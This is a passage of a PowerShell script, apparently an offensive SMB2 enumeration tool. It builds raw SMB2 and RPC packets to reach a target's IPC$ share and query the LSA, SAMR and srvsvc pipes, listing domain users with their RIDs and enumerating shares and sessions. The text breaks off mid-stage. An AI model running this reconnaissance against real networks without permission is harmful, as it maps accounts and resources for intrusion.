        $SMB_path = "\\" + $Target + "\IPC$"
        $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_path)

        if($Action -eq 'Share' -or $Action -eq 'NetSession')
        {
            $SMB_named_pipe_UUID = 0xc8,0x4f,0x32,0x4b,0x70,0x16,0xd3,0x01,0x12,0x78,0x5a,0x47,0xbf,0x6e,0xe1,0x88
        }
        elseif($Action -eq 'User')
        {
            $SMB_named_pipe_UUID = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xab
        }
        
        if($SMB_version -eq 'SMB1')
        {
            Write-Output "[-] SMB1 is not supported"
            throw
        }  
        else
        {
            $SMB_client_stage = 'TreeConnect'

            :SMB_execute_loop while ($SMB_client_stage -ne 'exit')
            {

                switch ($SMB_client_stage)
                {
            
                    'TreeConnect'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID

                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SMB2_data = New-PacketSMB2TreeConnectRequest $SMB_path_bytes
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                        try
                        {
                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                            $SMB_client_stream.Flush()
                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                            $SMB2_tree_ID = $SMB_client_receive[40..43]
                            $SMB_client_stage = 'CreateRequest'
                        }
                        catch
                        {
                            Write-Output "[-] Session connection is closed"
                            $SMB_client_stage = 'Exit'
                        }
                        
                    }
                  
                    'CreateRequest'
                    {
                        
                        if($Action -eq 'Share' -or $action -eq 'NetSession')
                        {
                            $SMB_named_pipe_bytes = 0x73,0x00,0x72,0x00,0x76,0x00,0x73,0x00,0x76,0x00,0x63,0x00 # srvsvc
                        }
                        elseif($SAMR_step -eq 2)
                        {
                            $SMB_named_pipe_bytes = 0x73,0x00,0x61,0x00,0x6d,0x00,0x72,0x00 # samr
                        }
                        else
                        {
                            $SMB_named_pipe_bytes = 0x6c,0x00,0x73,0x00,0x61,0x00,0x72,0x00,0x70,0x00,0x63,0x00 # lsarpc
                        }

                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SMB2_data = New-PacketSMB2CreateRequestFile $SMB_named_pipe_bytes
                        $packet_SMB2_data["DesiredAccess"] = 0x9f,0x01,0x12,0x00
                        $packet_SMB2_data["FileAttributes"] = 0x00,0x00,0x00,0x00
                        $packet_SMB2_data["ShareAccess"] = 0x07,0x00,0x00,0x00  
                        $packet_SMB2_data["CreateOptions"] = 0x00,0x00,0x00,0x00
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data  
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data  
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                        try
                        {
                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                            $SMB_client_stream.Flush()
                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        }
                        catch
                        {
                            Write-Output "[-] Session connection is closed"
                            $SMB_client_stage = 'Exit'
                        }

                        if($Refresh -and $SMB_client_stage -ne 'Exit')
                        {
                            Write-Output "[+] Session refreshed"
                            $SMB_client_stage = 'Exit'
                        }
                        elseif($SAMR_step -eq 2)
                        {
                            $SMB_file_GUID = $SMB_client_receive[132..147]
                            $SMB_client_stage = 'RPCBind'
                        }
                        elseif($SMB_client_stage -ne 'Exit')
                        {
                            $SMB_file_GUID = $SMB_client_receive[132..147]
                            $SMB_client_stage = 'QueryInfoRequest'
                        }

                    }

                    'QueryInfoRequest'
                    {
                        $SMB_file_ID = $SMB_client_receive[132..147]
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x10,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID

                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SMB2_data = New-PacketSMB2QueryInfoRequest 0x01 0x05 0x18,0x00,0x00,0x00 0x68,0x00 $SMB_file_ID
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'RPCBind'
                    }
                
                    'RPCBind'
                    {
                        $SMB_named_pipe_bytes = 0x73,0x00,0x72,0x00,0x76,0x00,0x73,0x00,0x76,0x00,0x63,0x00 # srvsvc
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        if($Action -eq 'Share')
                        {
                            $SMB_named_pipe_UUID = 0xc8,0x4f,0x32,0x4b,0x70,0x16,0xd3,0x01,0x12,0x78,0x5a,0x47,0xbf,0x6e,0xe1,0x88
                            $packet_RPC_data = New-PacketRPCBind 0x48,0x00 2 0x01 0x00,0x00 $SMB_named_pipe_UUID 0x03,0x00
                            $SMB_client_stage_next = 'NetShareEnumAll'
                        }
                        elseif($Action -eq 'NetSession')
                        {
                            $packet_RPC_data = New-PacketRPCBind 0x74,0x00 2 0x02 0x00,0x00 $SMB_named_pipe_UUID 0x03,0x00
                            $SMB_client_stage_next = 'NetSessEnum'
                        }
                        elseif($SAMR_step -eq 2)
                        {
                            $SMB_named_pipe_UUID = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xac
                            $packet_RPC_data = New-PacketRPCBind 0x48,0x00 5 0x01 0x00,0x00 $SMB_named_pipe_UUID 0x01,0x00
                            $SMB_file_ID = $SMB_file_GUID
                            $SMB_client_stage_next = 'Connect5'
                        }
                        else
                        {
                            $SMB_named_pipe_bytes = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0x76,0x00,0x63,0x00
                            $packet_RPC_data = New-PacketRPCBind 0x48,0x00 1 0x01 0x00,0x00 $SMB_named_pipe_UUID 0x00,0x00
                            $SMB_client_stage_next = 'LSAOpenPolicy'
                        }
                        
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadRequest'
                        
                        
                    }
               
                    'ReadRequest'
                    {
                        Start-Sleep -m $Sleep
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SMB2_data = New-PacketSMB2ReadRequest $SMB_file_ID
                        $packet_SMB2_data["Length"] = 0x00,0x04,0x00,0x00
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '03-01-00-00')
                        {
                            $SMB_client_stage = $SMB_client_stage_next
                        }
                        else
                        {
                            $SMB_client_stage = 'StatusPending'
                        }

                    }

                    'StatusPending'
                    {
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '03-01-00-00')
                        {
                            $SMB_client_stage = $SMB_client_stage_next
                        }

                    }

                    'LSAOpenPolicy'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_LSARPC_data = New-PacketLSAOpenPolicy
                        $LSARPC_data = ConvertFrom-PacketOrderedDictionary $packet_LSARPC_data 
                        $packet_SMB2_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $SMB_file_GUID $LSARPC_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $LSARPC_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x06,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length + $LSARPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $LSARPC_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $LSARPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'LSAQueryInfoPolicy'
                        $SMB_client_stage_next = 'CheckAccess'        
                    }

                    'LSAQueryInfoPolicy'
                    {
                        [Byte[]]$SMB_policy_handle = $SMB_client_receive[140..159]
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_LSARPC_data = New-PacketLSAQueryInfoPolicy $SMB_policy_handle
                        $LSARPC_data = ConvertFrom-PacketOrderedDictionary $packet_LSARPC_data
                        $packet_SMB2_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $SMB_file_GUID $LSARPC_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $LSARPC_data.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x07,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data   
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length + $LSARPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $LSARPC_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $LSARPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'LSAClose'
                        $SMB_client_stage_next = 'CheckAccess'        
                    }

                    'LSAClose'
                    {
                        [Byte[]]$LSA_domain_length_bytes = $SMB_client_receive[148..149]
                        $LSA_domain_length = [System.BitConverter]::ToInt16($LSA_domain_length_bytes,0)
                        [Byte[]]$LSA_domain_actual_count_bytes = $SMB_client_receive[168..171]
                        $LSA_domain_actual_count = [System.BitConverter]::ToInt32($LSA_domain_actual_count_bytes,0)
                        
                        if($LSA_domain_actual_count % 2)
                        {
                            $LSA_domain_length += 2
                        }

                        [Byte[]]$LSA_domain_SID = $SMB_client_receive[(176 + $LSA_domain_length)..(199 + $LSA_domain_length)]
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_LSARPC_data = New-PacketLSAClose $SMB_policy_handle
                        $LSARPC_data = ConvertFrom-PacketOrderedDictionary $packet_LSARPC_data 
                        $packet_SMB2_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $SMB_file_GUID $LSARPC_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $LSARPC_data.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length + $LSARPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $LSARPC_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $LSARPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'CloseRequest'
                        $SAMR_step = 2
                        $SMB_client_stage_next = 'CheckAccess'        
                    }

                    'Connect5'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SAMR_data = New-PacketSAMRConnect5 $Target
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_SMB2_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $SMB_file_GUID $SAMR_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x06,0x00,0x00,0x00 0x00,0x00 0x40,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SAMR_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SAMR_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'OpenDomain'
                        $SAMR_step = 3
                        $SMB_client_stage_next = 'CheckAccess'        
                    }

                    'OpenDomain'
                    {
                        [Byte[]]$SAMR_connect_handle = $SMB_client_receive[156..175]   
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SAMR_data = New-PacketSAMROpenDomain $SAMR_connect_handle $LSA_domain_SID
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_SMB2_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $SMB_file_GUID $SAMR_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x07,0x00,0x00,0x00 0x00,0x00 0x07,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SAMR_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SAMR_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'EnumDomainUsers'
                        $SAMR_step = 3
                        $SMB_client_stage_next = 'CheckAccess'        
                    }

                    'EnumDomainUsers'
                    {
                        [Byte[]]$SAMR_domain_handle = $SMB_client_receive[140..159]
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SAMR_data = New-PacketSAMREnumDomainUsers $SAMR_domain_handle
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x08,0x00,0x00,0x00 0x00,0x00 0x0d,0x00
                        $packet_SMB2_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $SMB_file_GUID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SAMR_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SAMR_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SAMR_step = 3
                        $SMB_client_stage_next = 'ParseUsers'
                        
                        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '03-01-00-00')
                        {
                            $SMB_client_stage = $SMB_client_stage_next
                        }
                        else
                        {
                            $SMB_client_stage = 'StatusPending'
                        }

                    }

                    'ParseUsers'
                    {
                        [Byte[]]$response_user_count_bytes = $SMB_client_receive[148..151]
                        $response_user_count = [System.BitConverter]::ToInt16($response_user_count_bytes,0)
                        $response_user_start = $response_user_count * 12 + 172
                        $response_user_end = $response_user_start
                        $response_RID_start = 160
                        $response_user_length_start = 164
                        $response_user_list = @()
                        $i = 0

                        while($i -lt $response_user_count)
                        {
                            $response_user_object = New-Object PSObject
                            [Byte[]]$response_user_length_bytes = $SMB_client_receive[$response_user_length_start..($response_user_length_start + 1)]
                            $response_user_length = [System.BitConverter]::ToInt16($response_user_length_bytes,0)
                            [Byte[]]$response_RID_bytes = $SMB_client_receive[$response_RID_start..($response_RID_start + 3)]
                            $response_RID = [System.BitConverter]::ToInt16($response_RID_bytes,0)
                            $response_user_end = $response_user_start + $response_user_length
                            [Byte[]]$response_actual_count_bytes = $SMB_client_receive[($response_user_start - 4)..($response_user_start - 1)]
                            $response_actual_count = [System.BitConverter]::ToInt16($response_actual_count_bytes,0)
                            [Byte[]]$response_user_bytes = $SMB_client_receive[$response_user_start..($response_user_end - 1)]
                            
                            if($response_actual_count % 2)
                            {
                                $response_user_start += $response_user_length + 14
                            }
                            else
                            {
                                $response_user_start += $response_user_length + 12
                            }

                            $response_user = [System.BitConverter]::ToString($response_user_bytes)
                            $response_user = $response_user -replace "-00",""
                            $response_user = $response_user.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $response_user = New-Object System.String ($response_user,0,$response_user.Length)
                            Add-Member -InputObject $response_user_object -MemberType NoteProperty -Name Username $response_user
                            Add-Member -InputObject $response_user_object -MemberType NoteProperty -Name RID $response_RID
                            $response_user_length_start = $response_user_length_start + 12
                            $response_RID_start = $response_RID_start + 12
                            $response_user_list += $response_user_object
                            $i++
                        }

                        Write-Output $response_user_list | Sort-Object -property Username |Format-Table -AutoSize
                        $SMB_client_stage = 'CloseRequest'
                    }

                    'NetShareEnumAll'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SRVSVC_data = New-PacketSRVSVCNetShareEnumAll $Target
                        $SRVSVC_data = ConvertFrom-PacketOrderedDictionary $packet_SRVSVC_data 
                        $packet_SMB2_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $SMB_file_GUID $SRVSVC_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SRVSVC_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length + $SRVSVC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SRVSVC_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SRVSVC_data
